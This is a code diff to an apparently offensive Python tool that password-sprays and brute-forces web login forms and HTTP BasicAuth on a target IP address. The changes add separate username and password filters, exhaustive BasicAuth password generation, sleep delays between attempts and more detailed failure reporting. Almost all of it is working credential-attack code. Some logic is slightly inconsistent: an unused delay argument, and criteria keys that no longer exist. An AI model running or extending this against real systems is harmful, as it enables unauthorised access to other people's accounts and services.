@@ -41,17 +41,27 @@ def display_help():
     Usage: {TOOL_NAME} [options]
 
     Options:
-        -h, --help              Show this help message and exit
-        -u, --users             Specify the file containing usernames
-        -p, --pass              Specify the file containing passwords
-        -i, --ip                Specify the target IP address
-        --version               Show the tool version and exit
-        --min-len               Specify the minimum length of usernames or passwords
-        --max-len               Specify the maximum length of usernames or passwords
-        --uppercase             Require at least 1 uppercase letter
-        --lowercase             Require at least 1 lowercase letter
-        --numbers               Require at least 1 number
-        --special-chars         Require at least 1 special character (e.g., !, @, #)
+        -h, --help                  Show this help message and exit
+        -u, --users                 Specify the file containing usernames
+        -p, --pass                  Specify the file containing passwords
+        -i, --ip                    Specify the target IP address
+        --version                   Show the tool version and exit
+        
+        Username Criteria:
+        --username-min-len          Specify the minimum length of usernames
+        --username-max-len          Specify the maximum length of usernames
+        --username-uppercase        Require at least 1 uppercase letter in usernames
+        --username-lowercase        Require at least 1 lowercase letter in usernames
+        --username-numbers          Require at least 1 number in usernames
+        --username-special-chars    Require at least 1 special character in usernames (e.g., !, @, #)
+
+        Password Criteria:
+        --password-min-len          Specify the minimum length of passwords
+        --password-max-len          Specify the maximum length of passwords
+        --password-uppercase        Require at least 1 uppercase letter in passwords
+        --password-lowercase        Require at least 1 lowercase letter in passwords
+        --password-numbers          Require at least 1 number in passwords
+        --password-special-chars    Require at least 1 special character in passwords (e.g., !, @, #)
     """
     print(help_text)
 
@@ -122,20 +132,19 @@ def is_password_requested_basic_auth(url, session):
     try:
         # Send a GET request to check if BasicAuth is required
         response = session.get(url, timeout=10, allow_redirects=False)
-
+    
         # Check if the response is a 401 Unauthorized indicating BasicAuth is needed
         if response.status_code == 401:
             print(f"{Fore.GREEN}BasicAuth required on {url}")
             return True
         
+        elif response.status_code == 403:
+            print(f"{Fore.RED}Access forbidden. Reason: {response.reason}")
+        
         else:
             print(f"No BasicAuth required on {url}")
             return False
         
-        failure_reason = extract_failure_reason(response.text)
-        print(f"{Fore.RED}Login failed for {username} on {full_url}. Reason: {failure_reason}")
-        return None
-
     except RequestException as e:
         print(f"Error checking {url}: {e}")
         return False
@@ -175,11 +184,28 @@ def is_password_requested_basic_password_field(url, session):
 
 
 
-# Function to filter usernames or passwords based on user criteria
+# Parse user-specified criteria
+criteria = {
+    'username_min_len': int(sys.argv[sys.argv.index('--username-min-len') + 1]) if '--username-min-len' in sys.argv else None,
+    'username_max_len': int(sys.argv[sys.argv.index('--username-max-len') + 1]) if '--username-max-len' in sys.argv else None,
+    'username_uppercase': '--username-uppercase' in sys.argv,
+    'username_lowercase': '--username-lowercase' in sys.argv,
+    'username_numbers': '--username-numbers' in sys.argv,
+    'username_special_chars': '--username-special-chars' in sys.argv,
+    
+    'password_min_len': int(sys.argv[sys.argv.index('--password-min-len') + 1]) if '--password-min-len' in sys.argv else None,
+    'password_max_len': int(sys.argv[sys.argv.index('--password-max-len') + 1]) if '--password-max-len' in sys.argv else None,
+    'password_uppercase': '--password-uppercase' in sys.argv,
+    'password_lowercase': '--password-lowercase' in sys.argv,
+    'password_numbers': '--password-numbers' in sys.argv,
+    'password_special_chars': '--password-special-chars' in sys.argv
+}
+
+# Modify filter_by_criteria function to handle username and password criteria separately
 def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lowercase=False, numbers=False, special_chars=False):
     """
     Filters a list of usernames or passwords based on specified criteria.
-
+    
     Args:
         items (list): A list of usernames or passwords to filter.
         min_len (int): Minimum length.
@@ -210,6 +236,8 @@ def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lower
         filtered.append(item)
     
     return filtered
+
+
 
 # Function to extract form fields from a login page
 def extract_form_fields(soup):
@@ -330,11 +358,26 @@ def generate_password_variants(password):
     
     return variants
 
-# Function to perform bruteforce
-def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check):
-    print(f"{Fore.YELLOW}Starting bruteforce attack...{Style.RESET_ALL}")
+def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=2):
+    """
+    Performs brute force attempts on login forms or BasicAuth with a time delay between each attempt.
+
+    Args:
+        username_file (str): Path to the username file.
+        password_file (str): Path to the password file.
+        ip_address (str): IP address of the target.
+        criteria (dict): Criteria for usernames and passwords.
+        session (Session): Session object to maintain cookies across requests.
+        pages_to_check (list): List of pages to attempt brute force on.
+        delay (int): Time delay (in seconds) between each brute force attempt.
+    """
+    print(f"{Fore.YELLOW}Starting brute force attack...{Style.RESET_ALL}")
     
-    # Characters to use for bruteforce passwords
+    # Set default values for min_len and max_len if they are None
+    min_len = criteria.get('min_len', 1)  # Set default minimum length to 1
+    max_len = criteria.get('max_len', 8)  # Set default maximum length to 8
+
+    # Characters to use for brute-force passwords
     bruteforce_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
     
     # Load the list of usernames
@@ -342,20 +385,37 @@ def perform_bruteforce(username_file, password_file, ip_address, criteria, sessi
         usernames = [line.strip() for line in user_file.readlines()]
     
     # Bruteforce each password length and combination
-    for length in range(criteria['min_len'], criteria['max_len'] + 1):
+    for length in range(min_len, max_len + 1):
         for password_tuple in itertools.product(bruteforce_chars, repeat=length):
             bruteforce_password = ''.join(password_tuple)
-            print(f"{Fore.WHITE}Trying bruteforce password: {bruteforce_password}{Style.RESET_ALL}")
-            # Attempt login with each username and the generated bruteforce password
+            print(f"{Fore.WHITE}Trying brute-force password: {bruteforce_password}{Style.RESET_ALL}")
+            
+            # Attempt login with each username and the generated brute-force password
             for page in pages_to_check:
                 full_url = urljoin(f'http://{ip_address}', page)
                 
-                if is_password_requested_basic_password_field(full_url, session):
+                # Check for either a password field or BasicAuth requirement
+                if is_password_requested_basic_password_field(full_url, session) or is_password_requested_basic_auth(full_url, session):
                     for username in usernames:
-                        credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
+                        # Attempt form-based login if password field is present
+                        if is_password_requested_basic_password_field(full_url, session):
+                            credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
+                        
+                        # Attempt BasicAuth if BasicAuth is required
+                        elif is_password_requested_basic_auth(full_url, session):
+                            response = session.get(full_url, auth=HTTPBasicAuth(username, bruteforce_password))
+                            if response.status_code == 200:
+                                credentials = (username, bruteforce_password)
+                            else:
+                                credentials = None
+                        
+                        # If successful, print and return
                         if credentials:
                             print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
-                            return  # Stop after the first successful bruteforce
+                            return  # Stop after the first successful brute-force
+                        
+                        # Delay between each attempt
+                        time.sleep(5)
 
 # Modify the password_spraying function to include bruteforce and character substitution
 def password_spraying(ip_address, username_file, password_file, criteria):
@@ -371,8 +431,21 @@ def password_spraying(ip_address, username_file, password_file, criteria):
         passwords = [line.strip() for line in pass_file.readlines()]
 
     # Filter usernames and passwords by the specified criteria
-    usernames = filter_by_criteria(usernames, **criteria)
-    passwords = filter_by_criteria(passwords, **criteria)
+    usernames = filter_by_criteria(usernames, 
+                                   min_len=criteria['username_min_len'], 
+                                   max_len=criteria['username_max_len'], 
+                                   uppercase=criteria['username_uppercase'], 
+                                   lowercase=criteria['username_lowercase'], 
+                                   numbers=criteria['username_numbers'], 
+                                   special_chars=criteria['username_special_chars'])
+
+    passwords = filter_by_criteria(passwords, 
+                                   min_len=criteria['password_min_len'], 
+                                   max_len=criteria['password_max_len'], 
+                                   uppercase=criteria['password_uppercase'], 
+                                   lowercase=criteria['password_lowercase'], 
+                                   numbers=criteria['password_numbers'], 
+                                   special_chars=criteria['password_special_chars'])
 
     # Create a session to persist cookies across requests
     session = requests.Session()
@@ -416,9 +489,17 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                             print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
                             successful_cracks.append((full_url, username, password))
                         else:
-                            print(f"{Fore.RED}Failed! Failed BasicAuth with credentials: Username: {username}, Password: {password} on {full_url}")
+                            # Print a more detailed error reason based on the response code
+                            if response.status_code == 401:
+                                print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
+                            elif response.status_code == 403:
+                                print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
+                            else:
+                                print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}")
+                    
                             failed_cracks.append((full_url, username, password))
                         time.sleep(10)
+
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
@@ -489,7 +570,6 @@ def extract_failure_reason(html_content):
     return ' | '.join(error_texts)
 
 
-
 # Main function
 def main():
     """
@@ -514,12 +594,19 @@ def main():
     
     # Parse user-specified criteria
     criteria = {
-        'min_len': int(sys.argv[sys.argv.index('--min-len') + 1]) if '--min-len' in sys.argv else None,
-        'max_len': int(sys.argv[sys.argv.index('--max-len') + 1]) if '--max-len' in sys.argv else None,
-        'uppercase': '--uppercase' in sys.argv,
-        'lowercase': '--lowercase' in sys.argv,
-        'numbers': '--numbers' in sys.argv,
-        'special_chars': '--special-chars' in sys.argv
+        'username_min_len': int(sys.argv[sys.argv.index('--username-min-len') + 1]) if '--username-min-len' in sys.argv else None,
+        'username_max_len': int(sys.argv[sys.argv.index('--username-max-len') + 1]) if '--username-max-len' in sys.argv else None,
+        'username_uppercase': '--username-uppercase' in sys.argv,
+        'username_lowercase': '--username-lowercase' in sys.argv,
+        'username_numbers': '--username-numbers' in sys.argv,
+        'username_special_chars': '--username-special-chars' in sys.argv,
+        
+        'password_min_len': int(sys.argv[sys.argv.index('--password-min-len') + 1]) if '--password-min-len' in sys.argv else None,
+        'password_max_len': int(sys.argv[sys.argv.index('--password-max-len') + 1]) if '--password-max-len' in sys.argv else None,
+        'password_uppercase': '--password-uppercase' in sys.argv,
+        'password_lowercase': '--password-lowercase' in sys.argv,
+        'password_numbers': '--password-numbers' in sys.argv,
+        'password_special_chars': '--password-special-chars' in sys.argv
     }
 
     # Get the values of the provided arguments
